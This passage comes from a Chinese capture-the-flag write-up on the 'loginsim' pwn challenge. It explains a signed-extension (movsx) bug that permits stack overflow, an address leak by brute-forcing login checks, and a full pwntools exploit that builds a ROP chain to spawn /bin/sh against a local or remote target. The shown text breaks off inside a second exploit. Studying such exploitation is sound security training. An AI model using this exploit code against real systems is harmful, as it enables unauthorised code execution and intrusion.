class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">0x00005630ed0c92fd &lt;+0&gt;:     push   rbp</span><br><span class="line"> 0x00005630ed0c92fe &lt;+1&gt;:     mov    rbp,rsp</span><br><span class="line"> 0x00005630ed0c9301 &lt;+4&gt;:     sub    rsp,0x20</span><br><span class="line"> 0x00005630ed0c9305 &lt;+8&gt;:     mov    QWORD PTR [rbp-0x18],rdi</span><br><span class="line"> 0x00005630ed0c9309 &lt;+12&gt;:    mov    DWORD PTR [rbp-0x1c],esi</span><br><span class="line"> 0x00005630ed0c930c &lt;+15&gt;:    mov    rax,QWORD PTR fs:0x28</span><br><span class="line"> 0x00005630ed0c9315 &lt;+24&gt;:    mov    QWORD PTR [rbp-0x8],rax</span><br><span class="line"> 0x00005630ed0c9319 &lt;+28&gt;:    xor    eax,eax</span><br><span class="line"> 0x00005630ed0c931b &lt;+30&gt;:    mov    BYTE PTR [rbp-0x9],0x0</span><br><span class="line"> 0x00005630ed0c931f &lt;+34&gt;:    jmp    0x5630ed0c936f &lt;getInput+114&gt;</span><br><span class="line"> 0x00005630ed0c9321 &lt;+36&gt;:    lea    rax,[rbp-0xa]</span><br><span class="line"> 0x00005630ed0c9325 &lt;+40&gt;:    mov    edx,0x1</span><br><span class="line"> 0x00005630ed0c932a &lt;+45&gt;:    mov    rsi,rax</span><br><span class="line"> 0x00005630ed0c932d &lt;+48&gt;:    mov    edi,0x0</span><br><span class="line"> 0x00005630ed0c9332 &lt;+53&gt;:    mov    eax,0x0</span><br><span class="line"> 0x00005630ed0c9337 &lt;+58&gt;:    call   0x5630ed0c9070 &lt;read@plt&gt;</span><br><span class="line"> 0x00005630ed0c933c &lt;+63&gt;:    test   eax,eax</span><br><span class="line"> 0x00005630ed0c933e &lt;+65&gt;:    jle    0x5630ed0c937a &lt;getInput+125&gt;</span><br><span class="line"> 0x00005630ed0c9340 &lt;+67&gt;:    movzx  eax,BYTE PTR [rbp-0xa]</span><br><span class="line"> 0x00005630ed0c9344 &lt;+71&gt;:    cmp    al,0x20</span><br><span class="line"> 0x00005630ed0c9346 &lt;+73&gt;:    je     0x5630ed0c9364 &lt;getInput+103&gt;</span><br><span class="line"> 0x00005630ed0c9348 &lt;+75&gt;:    movzx  eax,BYTE PTR [rbp-0xa]</span><br><span class="line"> 0x00005630ed0c934c &lt;+79&gt;:    cmp    al,0xa</span><br><span class="line"> 0x00005630ed0c934e &lt;+81&gt;:    je     0x5630ed0c937d &lt;getInput+128&gt;</span><br><span class="line"> 0x00005630ed0c9350 &lt;+83&gt;:    movsx  rdx,BYTE PTR [rbp-0x9]</span><br><span class="line"> 0x00005630ed0c9355 &lt;+88&gt;:    mov    rax,QWORD PTR [rbp-0x18]</span><br><span class="line"> 0x00005630ed0c9359 &lt;+92&gt;:    add    rdx,rax</span><br><span class="line"> 0x00005630ed0c935c &lt;+95&gt;:    movzx  eax,BYTE PTR [rbp-0xa]</span><br><span class="line"> 0x00005630ed0c9360 &lt;+99&gt;:    mov    BYTE PTR [rdx],al</span><br><span class="line"> 0x00005630ed0c9362 &lt;+101&gt;:   jmp    0x5630ed0c9365 &lt;getInput+104&gt;</span><br><span class="line"> 0x00005630ed0c9364 &lt;+103&gt;:   nop</span><br><span class="line"> 0x00005630ed0c9365 &lt;+104&gt;:   movzx  eax,BYTE PTR [rbp-0x9]</span><br><span class="line"> 0x00005630ed0c9369 &lt;+108&gt;:   add    eax,0x1</span><br><span class="line"> 0x00005630ed0c936c &lt;+111&gt;:   mov    BYTE PTR [rbp-0x9],al</span><br><span class="line"> 0x00005630ed0c936f &lt;+114&gt;:   movsx  eax,BYTE PTR [rbp-0x9]</span><br><span class="line"> 0x00005630ed0c9373 &lt;+118&gt;:   cmp    DWORD PTR [rbp-0x1c],eax</span><br><span class="line"> 0x00005630ed0c9376 &lt;+121&gt;:   jg     0x5630ed0c9321 &lt;getInput+36&gt;</span><br><span class="line"> 0x00005630ed0c9378 &lt;+123&gt;:   jmp    0x5630ed0c937e &lt;getInput+129&gt;</span><br><span class="line"> 0x00005630ed0c937a &lt;+125&gt;:   nop</span><br><span class="line"> 0x00005630ed0c937b &lt;+126&gt;:   jmp    0x5630ed0c937e &lt;getInput+129&gt;</span><br><span class="line"> 0x00005630ed0c937d &lt;+128&gt;:   nop</span><br><span class="line"> 0x00005630ed0c937e &lt;+129&gt;:   nop</span><br><span class="line"> 0x00005630ed0c937f &lt;+130&gt;:   mov    rax,QWORD PTR [rbp-0x8]</span><br><span class="line"> 0x00005630ed0c9383 &lt;+134&gt;:   sub    rax,QWORD PTR fs:0x28</span><br><span class="line"> 0x00005630ed0c938c &lt;+143&gt;:   je     0x5630ed0c9393 &lt;getInput+150&gt;</span><br><span class="line"> 0x00005630ed0c938e &lt;+145&gt;:   call   0x5630ed0c9050 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line"> 0x00005630ed0c9393 &lt;+150&gt;:   leave</span><br><span class="line"> 0x00005630ed0c9394 &lt;+151&gt;:   ret</span><br></pre></td></tr></table></figure><p>重点是这一个部分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x00005630ed0c9350 &lt;+83&gt;:    movsx  rdx,BYTE PTR [rbp-0x9]</span><br><span class="line">0x00005630ed0c9355 &lt;+88&gt;:    mov    rax,QWORD PTR [rbp-0x18]</span><br><span class="line">0x00005630ed0c9359 &lt;+92&gt;:    add    rdx,rax</span><br><span class="line">0x00005630ed0c935c &lt;+95&gt;:    movzx  eax,BYTE PTR [rbp-0xa]</span><br><span class="line">0x00005630ed0c9360 &lt;+99&gt;:    mov    BYTE PTR [rdx],al</span><br></pre></td></tr></table></figure><p>这段的本意是，完成反汇编代码<code>*(_BYTE *)(a1 + i) = buf;</code>的作用，即，将一个字符放该存放它的地方，形成字符串。</p><p>但是由于使用了<code>movsx</code> 和<code>movzx</code>两个指令，这两指令都是<a href="https://baike.baidu.com/item/数据传送/500685" target="_blank" rel="noopener">数据传送</a>指令MOV的变体。<code>movsx</code>是带符号扩展，并传送。<code>movzx</code>是无符号扩展，并传送.因此在处理一些数据时，会有不同的表现。</p><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MOV BL,80H</span><br><span class="line">MOVSX AX,BL</span><br><span class="line"></span><br><span class="line">mov BL, 80H</span><br><span class="line">MOVZX AX, BL</span><br></pre></td></tr></table></figure><p>运行完以上MOVSX指令语句之后，AX的值为FF80H。由于BL为80H=1000 0000，最高位也即符号位为1，在进行带符号扩展时，其扩展的高8位均为1，故赋值AX为1111 1111 1000 0000，即AX=FF80H。而在运行完以上MOVZX指令语句之后，AX的值为0080H。由于BL为80H，最高位也即符号位为1，但在进行无符号扩展时，其扩展的高8位均为0，故赋值AX为0080H。</p><p>这特性导致，若在题目中中[rbp-0x9]中为0x80时， <code>movsx  eax,BYTE PTR [rbp-0x9]</code>执行后，eax值是<code>0xffffffffffffff80</code>而非<code>0x80</code>.导致在执行<code>add    rdx,rax</code>时rdx相加的不是0x80而是<code>0xffffffffffffff80</code>.导致在<code>rbx+0xffffffffffffff80</code>写入了数据。</p><p>同理，在判断循环（<code>for ( i = 0; a2 &gt; i &amp;&amp; (signed int)read(0, &amp;buf, 1uLL) &gt; 0; ++i )</code>）是否结束是也用了<code>movsx</code>指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x00005630ed0c9369 &lt;+108&gt;:   add    eax,0x1</span><br><span class="line">0x00005630ed0c936c &lt;+111&gt;:   mov    BYTE PTR [rbp-0x9],al</span><br><span class="line">0x00005630ed0c936f &lt;+114&gt;:   movsx  eax,BYTE PTR [rbp-0x9]</span><br><span class="line">0x00005630ed0c9373 &lt;+118&gt;:   cmp    DWORD PTR [rbp-0x1c],eax</span><br></pre></td></tr></table></figure><p>由于是带符号比较，<code>0x80</code>(正数)是肯定大于<code>0xffffffffffffff80</code>(负数)。<strong>导致我们可以在输入0x80个字符后，继续写入字符。</strong></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="leak-addr"><a href="#leak-addr" class="headerlink" title="leak addr"></a>leak addr</h3><p>通过gdb我们可以发现，在login函数栈上残留了<code>_IO_2_1_stdout_</code>的数据和一个ELF段的地址。<img src="image-20220404112731311.png" alt="image-20220404112731311"></p><p>我们可以利用在register写入猜测的地址数据和数据长度，即构造恶意数据长度为已知道的数据+一位猜测数据，通过login来一个个检验我们猜测是否准确。这样通过strncmp检测，若我们猜测数据对了则显示login成功，未猜对就显示失败。</p><p>这样我们慢慢leak出<code>_IO_2_1_stdout_</code>的地址，由<code>_IO_2_1_stdout_</code>是glib上的函数，我们间接得到了libc的base addr和 system等libc函数的地址和one_getgad的地址。</p><p>我们通过一个ELF段的地址上的地址，从而间接得到程序ELF段的基础地址，从而推测出bss段或某一个可写地址的大概位置。</p><h3 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h3><p>之前我们知道getInput，有溢出的可能。经过gdb发现。getInput+<code>0xffffffffffffff80</code>的位置恰好，离rbp和返回地址很近。</p><p><img src="image-20220404152704003.png" alt="image-20220404152704003"></p><p>同时在getinput中我们的空格会保留栈上原本的数据。这样我们可以通过一定空格来到rbp和返回地址附近。从而，复写返回地址劫持rip，控制程序流。</p><h2 id="exp-local"><a href="#exp-local" class="headerlink" title="exp_local"></a>exp_local</h2><p>因此流程下来的exp，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/12/14 09:59:41</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="comment">#from libcfind import *</span></span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">1</span></span><br><span class="line">elf=<span class="string">'./loginsim'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="comment">#context.arch=e.arch</span></span><br><span class="line">ip_port=[<span class="string">'167.99.205.117'</span>,<span class="number">30301</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(mun,text)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    <span class="comment">#sleep(0.2)</span></span><br><span class="line">    p.recvuntil(<span class="string">'&#123;i&#125; Username length:'</span>)</span><br><span class="line">    p.sendline(str(mun))</span><br><span class="line">    p.recvuntil(<span class="string">'&#123;i&#125; Enter username:'</span>)</span><br><span class="line">    p.sendline(text)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(text)</span>:</span></span><br><span class="line">    <span class="comment">#sleep(0.2)</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'&#123;i&#125; Username:'</span>)</span><br><span class="line">    p.send(text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gess_libc</span><span class="params">(n)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#debug()</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">        <span class="comment">#i=0xff-i</span></span><br><span class="line">       <span class="comment"># sleep(0.1)</span></span><br><span class="line">        add(<span class="number">0x20</span>+n,<span class="string">'w'</span>*<span class="number">0x20</span>+<span class="string">'w'</span>*(n<span class="number">-1</span>)+chr(i))</span><br><span class="line">       <span class="comment"># sleep(0.2)</span></span><br><span class="line">        p.recvuntil(<span class="string">'-&gt;'</span>)</span><br><span class="line">       </span><br><span class="line">       <span class="comment">#print(i)</span></span><br><span class="line">       <span class="comment"># sleep(0.1)</span></span><br><span class="line">        login(<span class="string">'w'</span>*(<span class="number">0x20</span>+n<span class="number">-1</span>)+<span class="string">'\n'</span>)</span><br><span class="line">        line=p.recvline()[:<span class="number">-1</span>]</span><br><span class="line">                    <span class="comment">#print(i)</span></span><br><span class="line">        <span class="keyword">if</span> line!=<span class="string">' Invalid username! :)'</span>:</span><br><span class="line">                        print(hex(i))</span><br><span class="line">                        <span class="keyword">return</span> i</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xa</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gess</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="comment">#debug()</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">        <span class="comment">#i=0xff-i</span></span><br><span class="line">       <span class="comment"># sleep(0.1)</span></span><br><span class="line">        add(<span class="number">0x20</span>+n,<span class="string">'w'</span>*<span class="number">0x20</span>+<span class="string">'w'</span>*(n<span class="number">-1</span>)+chr(i))</span><br><span class="line">       <span class="comment"># sleep(0.2)</span></span><br><span class="line">        p.recvuntil(<span class="string">'-&gt;'</span>)</span><br><span class="line">       </span><br><span class="line">       <span class="comment">#print(i)</span></span><br><span class="line">       <span class="comment"># sleep(0.1)</span></span><br><span class="line">        login(<span class="string">'w'</span>*(<span class="number">0x20</span>+n<span class="number">-1</span>)+<span class="string">'\n'</span>)</span><br><span class="line">        line=p.recvline()[:<span class="number">-1</span>]</span><br><span class="line">                    <span class="comment">#print(i)</span></span><br><span class="line">        <span class="keyword">if</span> line!=<span class="string">' Invalid username! :)'</span>:</span><br><span class="line">                        print(hex(i))</span><br><span class="line">                        <span class="keyword">return</span> i</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xa</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">link</span><span class="params">()</span>:</span></span><br><span class="line">    x=<span class="number">0</span></span><br><span class="line">    k=<span class="number">0x100</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        x=x+gess(i+<span class="number">1</span>)*k</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">        k=k*<span class="number">0x100</span></span><br><span class="line">        log.info(hex(x//<span class="number">0x100</span>))</span><br><span class="line">    print(hex(x//<span class="number">0x100</span>))</span><br><span class="line">    <span class="keyword">return</span> x//<span class="number">0x100</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">elf_link</span><span class="params">()</span>:</span></span><br><span class="line">    x=<span class="number">0</span></span><br><span class="line">    k=<span class="number">0x100</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        x=x+gess(i+<span class="number">1</span>+<span class="number">8</span>)*k</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">        k=k*<span class="number">0x100</span></span><br><span class="line">        log.info(hex(x//<span class="number">0x100</span>))</span><br><span class="line">    print(hex(x//<span class="number">0x100</span>))</span><br><span class="line">    <span class="keyword">return</span> x//<span class="number">0x100</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">0xe6c7e execve("/bin/sh", r15, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe6c81 execve("/bin/sh", r15, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe6c84 execve("/bin/sh", rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="comment">#while True:</span></span><br><span class="line"><span class="comment">#    try :</span></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">            p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">            p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"><span class="keyword">if</span> <span class="literal">True</span>:</span><br><span class="line">        stdout_addr=link()</span><br><span class="line">        <span class="comment">#x=finder('_IO_2_1_stdout_',stdout_addr,num=1)</span></span><br><span class="line">        elf_base=elf_link()<span class="number">-0x25fe</span></span><br><span class="line">        libc_base=stdout_addr<span class="number">-0x1ec6a0</span></span><br><span class="line">        system_addr=<span class="number">0x000000000055410</span>+libc_base</span><br><span class="line">        gets_addr= <span class="number">0x86af0</span>+libc_base</span><br><span class="line">        puts_addr=<span class="number">0x0000000000875a0</span>+libc_base</span><br><span class="line">        rsi_ret=<span class="number">0x0000000000027529</span>+libc_base</span><br><span class="line">        rdi_ret=<span class="number">0x0000000000026b72</span>+libc_base</span><br><span class="line">        </span><br><span class="line">        bin_sh_addr=elf_base+<span class="number">0x4000</span>+<span class="number">0x100</span></span><br><span class="line">        ret=<span class="number">0x0000000000025679</span>+libc_base</span><br><span class="line">        log.info(<span class="string">'bin_sh_addr:'</span>+hex(bin_sh_addr))</span><br><span class="line">        log.info(<span class="string">'libc_base'</span>+hex(libc_base))</span><br><span class="line">        log.info(<span class="string">'elf_base:'</span>+hex(elf_base))</span><br><span class="line">        <span class="comment">#debug()</span></span><br><span class="line">        p.recv(timeout=<span class="number">4</span>)</span><br><span class="line">        p.sendline(<span class="string">'1'</span>)</span><br><span class="line">        p.sendline(str(<span class="number">0x80</span>))<span class="comment">#'z'*0x60+'j'*(0x100-0x20))</span></span><br><span class="line">        p.recv()</span><br><span class="line">        p.sendline(<span class="string">'w'</span>*(<span class="number">0x40</span>)+chr(<span class="number">0x20</span>)*<span class="number">0x78</span>+p64((rdi_ret))+p64(bin_sh_addr)+p64(rsi_ret)+p64(<span class="number">0</span>)+p64(ret)+p64(gets_addr)+p64((rdi_ret))+p64(bin_sh_addr)+p64(rsi_ret)+p64(<span class="number">0</span>)+p64(ret)+p64(gets_addr)+p64((rdi_ret))+p64(bin_sh_addr)+p64(rsi_ret)+p64(<span class="number">0</span>)+p64(ret)+p64(puts_addr)+p64((rdi_ret))+p64(bin_sh_addr)+p64(rsi_ret)+p64(<span class="number">0</span>)+p64(ret)+p64(system_addr))</span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line">        p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">        p.interactive()</span><br></pre></td></tr></table></figure><h2 id="remote-problem"><a href="#remote-problem" class="headerlink" title="remote_problem"></a>remote_problem</h2><p>看上面最初exp时间，可以看到我很久就在本地解决出来但是什么最近才打通远程呢？</p><p>根本原因是netwrok，与htb靶机交换时间太长。这是一个非常影响体验感的问题。在远程中出错也无法即时排查。(ps:应该给个dockerfile)</p><p>其次，我leak数据过多了，不仅要leak libc地址，还有leak elf的地址。我在想只需要libc地址。同时，由于不了解自身本地环境与远程机的寄存器和栈环境，是否完全相同也无法轻易使用 one_gadget 。但查阅资料发现libc中自身存在一个<code>/bin/sh</code>后门字符串。我们可以通过libc-database来查询得到这个地址，当然也可以用ROPgadget来找到这个地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary .&#x2F;glibc&#x2F;libc.so.6  --string &#39;&#x2F;bin&#x2F;sh&#39;</span><br><span class="line">Strings information</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">0x00000000001b75aa : &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure><p>于是我用我写的工具libcfind(<a href="https://github.com/lexsd6/LibcSearcher_plus" target="_blank" rel="noopener">LibcSearcher_plus</a>)来自动查询libc-database，验证本地与远程libc环境是否相同。</p><p>同时，我们用libc中自身存在一个<code>/bin/sh</code>后门字符串，就不需要leak 程序的基地址只需要libc的基础地址。</p><p>由于就算开了PIE与NX，一个libc函数在x64在一位一定是<code>\x7f</code>,末位一定是固定的。这样我们就可以少leak俩个位。加上不leak 程序的基地址。我们现在只需要leak 4位数大幅减少leak时间。让我们有更多机会试one_gadget 和system地址对齐的错。</p><h2 id="remote-exp"><a href="#remote-exp" class="headerlink" title="remote_exp"></a>remote_exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">1</span></span><br><span class="line">elf=<span class="string">'./loginsim'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span 